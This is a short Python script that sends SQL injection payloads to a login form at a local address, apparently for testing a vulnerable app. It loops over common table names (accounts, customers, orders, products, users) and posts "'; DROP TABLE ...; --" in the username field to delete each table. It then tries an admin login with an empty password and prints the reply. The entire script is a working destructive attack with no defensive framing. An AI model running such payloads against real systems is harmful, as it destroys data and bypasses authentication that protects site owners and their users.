import requests

# Define the target URL
url = 'http://127.0.0.1:5000/'

# Define the payloads for SQL injection with different table names
table_names = ['accounts', 'customers', 'orders', 'products' , 'users']
sql_injection_payload_template = "'; DROP TABLE {}; --"

# Attempt SQL injection for each table name
for table_name in table_names:
    sql_injection_payload = sql_injection_payload_template.format(table_name)
    response = requests.post(url, data={'username': sql_injection_payload, 'password': ''})

# Try a normal login attempt and print the response
username = 'admin'
password = ''
response = requests.post(url, data={'username': username, 'password': password})

print(f'\nLogin attempt response for after sql injection attampt with username: {username}')
print(response.text)

